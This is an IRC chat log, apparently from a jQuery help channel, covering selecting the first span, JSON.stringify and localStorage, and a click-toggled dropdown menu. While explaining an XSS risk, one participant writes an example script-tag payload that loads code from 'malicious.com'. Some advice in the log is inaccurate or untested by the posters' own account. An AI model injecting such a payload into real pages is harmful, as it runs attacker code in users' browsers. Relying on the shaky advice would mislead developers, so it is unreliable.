[18:46:15] <ns5> Hi, the original code is like this:  $p.find('.status-content').append(txt).  The code finds two spans and append text to each of them.  Now I need to append text only to the first span.  I tried  $p.find('.status-content').splice(0,1).append(txt) but gets error:  $p.find('.status-content').splice(0,1).append(txt)
[18:46:46] <ns5> the error is: Uncaught TypeError: Object [object Array] has no method 'append' .   Any idea?
[18:47:03] <doug65536> ns5: append doesn't append text
[18:47:27] <doug65536> you need to .text, use + to append it and set it with .text
[18:48:02] <doug65536> var sc = $('.status-content:first', $p); sc.text(sc.text() + txt)
[18:48:23] <ns5> doug65536: why does "$p.find('.status-content').append(txt)" work?
[18:48:57] <doug65536> ns5: why doesn't it work?
[18:49:21] <doug65536> append appends nodes
[18:50:59] <doug65536> ns5: if it does work it could be a XSS vulnerability
[18:51:25] <ns5> doug65536: then why does "$p.find('.status-content').splice(0,1).append(txt)" hit error?  "Uncaught TypeError: Object [object Array] has no method 'append'"
[18:51:46] <doug65536> because splice is an array function. the result is a raw dom element
[18:51:52] <doug65536> don't use splice
[18:51:54] <doug65536> use .first()
[18:52:05] <doug65536> or a pseudo selector (:first)
[18:53:00] <doug65536> splice is nonsense anyway. you must have meant slice
[18:53:08] <doug65536> .first() is shorthand for .slice(0,1)
[18:53:30] <ns5> doug65536: do you mean that "$p.find('.status-content').append(txt)" is bad code and has potential XSS vulnerability?
[18:53:38] <doug65536> yes
[18:53:42] <doug65536> if txt is malicious
[18:53:52] <doug65536> if the attacker can make txt = '<script src="malicious.com/malicious.js'>

[21:19:56] <Rohan_Bhangui> for long text
[21:20:17] <Rohan_Bhangui> like short text works fine
[21:20:26] <Rohan_Bhangui> but for like longer than 200 char text
[21:44:14] <doug65536> Rohan_Bhangui: you might need moz prefixes too
[21:44:34] <doug65536> it's not as smooth as I would expect but css keyframes are about as smooth as you can get

[22:29:03] <LoneSoldier728> hey
[22:29:14] <LoneSoldier728> anyone know how to remove brackets from an array of objects
[22:30:12] <Eviltwin> What?
[22:30:42] <Eviltwin> Why do you want to do that?
[22:36:28] <jphase> LoneSoldier728: if you were trying to do that as a string you could something like http://jsfiddle.net/jphase/Wdbpr/
[22:45:12] <LoneSoldier728> ya i guess i can use regex
[22:45:30] <LoneSoldier728> eviltwin i want to store it in localstorage
[22:45:46] <LoneSoldier728> but i cant stringify an array of objects
[22:45:53] <LoneSoldier728> JSON.stringify
[22:46:24] <jphase> it should, my fiddle is doing that
[22:46:56] <jphase> what's the application LoneSoldier728?
[22:47:28] <LoneSoldier728> it is still leaving them as objects
[22:47:54] <LoneSoldier728> but I can use the regex to remove
[22:47:56] <LoneSoldier728> the brackets
[22:48:11] <Eviltwin> Please don't use that regex
[22:48:23] <diverdude> Why is the change action not activated? http://jsfiddle.net/3sULv/1/
[22:48:24] <jphase> if you reallllly need as string then .toString would work
[22:49:04] <Eviltwin> Oh God
[22:49:12] <jphase> LoneSoldier728: can you not pass an object to your engine?
[22:49:26] <Eviltwin> Has advice really gotten this bad since I left?
[22:49:40] <jphase> Eviltwin: just answering a question, not talking about best practices here
[22:49:41] <LoneSoldier728> i need
[22:49:56] <LoneSoldier728> eviltwin u familiar with localstorage
[22:50:04] <Eviltwin> diverdude: Spelling
[22:50:12] <Eviltwin> LoneSoldier728: Somewhat, why can't you use JSON.stringify?
[22:50:27] <Eviltwin> It's the best tool you have in JavaScript for serializing an object
[22:50:38] <LoneSoldier728> because [{key: value}]
[22:50:51] <LoneSoldier728> and json.stringify
[22:50:54] <Eviltwin> But why is that a problem?

[22:52:09] <LoneSoldier728> and thats how u do it for arrays
[22:52:23] <diverdude> Eviltwin, doh..thanks
[22:52:30] <LoneSoldier728> basically
[22:52:33] <LoneSoldier728> I need a string
[22:52:46] <LoneSoldier728> and that is the point of json.stringify
[22:53:02] <LoneSoldier728> but i do not see a method of stringing an array and an object
[22:53:16] <LoneSoldier728> an array of objects
[22:53:17] <jphase> JSON.stringify does
[22:53:25] <LoneSoldier728> look at the output
[22:53:43] <jphase> [{"foo":"bar"},{"bar":2}] ?
[22:53:50] <LoneSoldier728> it should look like
[22:54:28] <Eviltwin> LoneSoldier728: Please look at the top answer which has helped at least 678 other people
[22:55:05] <jphase> :\  you wake up on the wrong side of the bed or somethin?
[22:55:53] <Eviltwin> I used to have more patience for this little stuff
[22:55:56] <jphase> LoneSoldier728: should work if you pass it with stringify, is there an error or anything?
[22:56:10] <LoneSoldier728> ya i did
[22:56:13] <LoneSoldier728> thats why i pasted it
[22:56:30] <Eviltwin> So why not use what they suggest verbatim?
[22:56:37] <Eviltwin> Why does it need to be changed?
[22:57:09] <Eviltwin> JSON.stringify turns any JSON type into a string representation that can be converted back into it's JavaScript representation using JSON.parse
[22:57:10] <jphase> I don't know localstorage too well, but if it only accepts objects and not an array of objects, just iterate through the array and do a separate local storage routine for each object
[22:57:14] <Eviltwin> It's not just limited to objects
[22:57:24] <Eviltwin> It works with arrays, numbers, booleans, etc too
[22:57:27] <jphase> oh, scratch what I said
[22:57:33] <LoneSoldier728> http://msdn.microsoft.com/en-us/library/ie/cc836459(v=vs.94).aspx
[22:57:42] <LoneSoldier728> u see that output for continents
[22:58:12] <LoneSoldier728> ok nvm, here is the dilemma for localStorage the way it stores items are just as strings right?
[22:58:40] <jphase> sure
[22:59:48] <Eviltwin> LoneSoldier728: What's your point about the MDN example?
[23:00:05] <LoneSoldier728> basically I need it to be a string to be able to store it in localstorage
[23:00:12] <Eviltwin> You'll notice they're passing in another argument to JSON.stringify which is making it do something retarded
[23:00:50] <LoneSoldier728> from what i understand for this object {title: "a", artist: "b"}
[23:01:07] <LoneSoldier728> I have to transform it to "title,a,artist,b"
[23:01:10] <LoneSoldier728> for localstorage
[23:01:14] <LoneSoldier728> or am i mixing that up?
[23:01:29] <Eviltwin> You can make it any string you want for local storage
[23:01:40] <Eviltwin> I don't know why you think it needs to be "title,a,artist,b"
[23:01:51] <Eviltwin> Where's that coming from?
[23:02:12] <Eviltwin> Let me back up a sec
[23:02:17] <Eviltwin> localStorage is designed to store strings
[23:02:25] <LoneSoldier728> right
[23:02:27] <Eviltwin> But you want to store something more than a string, you want to store an object
[23:02:34] <LoneSoldier728> correct
[23:02:46] <Eviltwin> JSON.stringify lets you turn an object into a string and turn that corresponding string back into an object via JSON.parse
[23:02:58] <LoneSoldier728> ok so let me clarify now
[23:03:02] <Eviltwin> From localStorage's perspective, you're just storing a string, it doesn't give a damn about what format it's in
[23:03:09] <Eviltwin> Or what data is contained within it
[23:03:26] <LoneSoldier728> if I did JSON.stringify({key1: val1, key2: val2})
[23:03:30] <LoneSoldier728> what should i expext
[23:03:46] <LoneSoldier728> as the outpu
[23:03:47] <LoneSoldier728> t
[23:04:12] <Eviltwin> ?eval JSON.stringify({key1: 'val1', key2: "val2"})
[23:04:21] <LoneSoldier728> ya
[23:04:25] <Eviltwin> Ugh, bot's never around when you want it to be
[23:04:29] <jphase> heh
[23:04:48] <Eviltwin> The output will be equivalent to this: '{"key1":"val1","key2":"val2"}'
[23:05:00] <LoneSoldier728> http://jsfiddle.net/Wdbpr/3/
[23:05:02] <LoneSoldier728> like that
[23:05:05] <Eviltwin> As if you had replaced that statement with the string I wrote
[23:05:05] <LoneSoldier728> right in the console
[23:05:19] <jphase> whoa
[23:05:21] <jphase> double stringify
[23:05:35] <jphase> undo one of demz
[23:05:47] <LoneSoldier728> huh
[23:05:48] <Eviltwin> Yeah, I'm not quite sure why you're using stringify twice here
[23:05:49] <LoneSoldier728> oh right
[23:06:24] <LoneSoldier728> http://jsfiddle.net/Wdbpr/6/
[23:06:30] <LoneSoldier728> so that is considered a string now
[23:06:34] <LoneSoldier728> what shows up in the console
[23:06:44] <LoneSoldier728> because i was under the impression the whole thing had to be wrapped in " "
[23:06:49] <jphase> same thing that does for you, is there an issue with that and local storage?
[23:07:11] <LoneSoldier728> well i get this error  at new JS_Parse_Error
[23:07:11] <jphase> oh, nah it's a string so when you pass it, it should be fine
[23:07:18] <jphase> hmm
[23:07:34] <LoneSoldier728> eviltwin
[23:07:40] <LoneSoldier728> im going to show u a pastebin
[23:07:50] <LoneSoldier728> or whoever can answer it

[23:10:33] <LoneSoldier728> http://pastebin.com/73LmFs5v
[23:11:11] <LoneSoldier728> are u familiar with jade
[23:12:47] <Eviltwin> Never used it
[23:12:49] <LoneSoldier728> http://pastebin.com/ULyQvxcX
[23:12:53] <LoneSoldier728> ok here is it with the error
[23:13:04] <LoneSoldier728> hm
[23:13:20] <LoneSoldier728> ok well basically in the jade file the -
[23:13:26] <LoneSoldier728> signifies javascript
[23:13:36] <jphase> LoneSoldier728: any reason for the extra [[]] ?
[23:13:37] <LoneSoldier728> and #{variable}
[23:13:43] <LoneSoldier728> lets u pass the variable
[23:14:05] <LoneSoldier728> well I wanted to see if i can make that work because I have a function that separates the objects in groups of 25
[23:14:08] <LoneSoldier728> for each subarray
[23:14:27] <LoneSoldier728> making it easier to make pages out of them essentially
[23:14:31] <Eviltwin> Okay, you do know that JSON.stringify(result) doesn't actually change result, right?
[23:14:32] <LoneSoldier728> and serve them
[23:14:38] <LoneSoldier728> ya i know
[23:14:42] <LoneSoldier728> i set it to a variable
[23:14:46] <LoneSoldier728> and pass that var in
[23:14:48] <LoneSoldier728> sorry about that
[23:14:51] <LoneSoldier728> didnt include it
[23:15:07] <LoneSoldier728> im actually returning a cb with it
[23:15:51] <Eviltwin> Is this actually live anywhere that I could take a look at it?
[23:16:21] <Eviltwin> I don't usually volunteer to look at people's pages but I don't know that I'm going to be able to help you otherwise.
[23:16:29] <LoneSoldier728> unfortunately not, ya i know
[23:16:48] <LoneSoldier728> im going to try a few things
[23:16:53] <LoneSoldier728> but in terms of stringifying
[23:16:57] <LoneSoldier728> then i have that down right?
[23:18:01] <Eviltwin> In terms of what I described with storing into and fetching from localStorage, yes
[23:18:22] <Eviltwin> Exactly as the top result on that StackOverflow answer
[23:18:55] <LoneSoldier728> ok
[23:19:19] <LoneSoldier728> ya there is a problem with the result hm kk i got to look into it more
[23:19:46] <LoneSoldier728> ah had the script out one too much
[23:19:56] <LoneSoldier728> ok ya its good now, but it didnt store in localStorage
[23:20:20] <LoneSoldier728> hm am I storing it wrong with localStorage.setItem('name', name)
[23:21:06] <jphase> that's correct
[23:21:45] <jphase> http://diveintohtml5.info/storage.html
[23:22:50] <LoneSoldier728> ya i was looking at that
[23:23:16] <LoneSoldier728> but it is not storing hm
[23:23:45] <Eviltwin> LoneSoldier728: http://jsfiddle.net/BrZAc/
[23:27:04] <LoneSoldier728> ya thats what I have, do I have to instantiate it or should it just set it
[23:27:09] <LoneSoldier728> as long as it is in script tags

[23:56:12] <dieguezz> hi, can somebody help me? i would like to make the menu dropdown toggle onclick instead on hover. How can i do that here'? http://goo.gl/1cybbY
[23:59:43] <fl0rian_> @dieguezz: $('li').click(function() { $(this).toggle();  });
[23:59:48] <jphase> dieguezz: that hover effect is css, so you'll have to get rid of that :hover first and then use jQuery
[23:59:56] <fl0rian_> @dieguezz: iam not sure, its untested :)
